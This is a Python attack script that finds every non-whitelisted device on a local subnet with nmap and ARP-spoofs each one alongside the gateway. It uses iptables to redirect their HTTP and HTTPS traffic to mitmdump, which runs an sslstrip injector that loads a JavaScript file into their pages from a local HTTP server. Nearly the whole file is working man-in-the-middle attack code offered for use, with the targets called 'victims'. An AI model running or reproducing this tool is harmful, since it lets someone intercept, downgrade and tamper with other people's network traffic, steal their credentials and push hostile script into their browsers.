import subprocess, re, os, sys

whitelist = 'whitelist.txt' # IP addresses not to target
port = '8080' # port to redirect traffic to

def get_victims(gateway):
    victims = []
    range = gateway.split('.')
    del range[3]
    range = '.'.join(range) + '.1-255'
    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
    ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's
    
    if not os.path.isfile(whitelist):
        victims = ip_list
        print("No %s! Continuing...") % whitelist
    else:
        for ip in ip_list:
            if not ip in open(whitelist).read() and not ip == gateway:
                #add ip to victim's list if it's not in whitelist.txt
                victims.append(ip)
            else:
                print("Skipping whitelisted ip " + ip)
        
    return victims
    
#get gateway_ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
# get victims_ip
victims = get_victims(gateway)
print("victims: ")
for v in victims:
    print(v)

# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port " + port)


# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i wlan0 -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i wlan0 -t " + gateway + " " + victim + " &")

# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start the mitmproxy
os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://192.168.0.14:8000/script.js' -T")
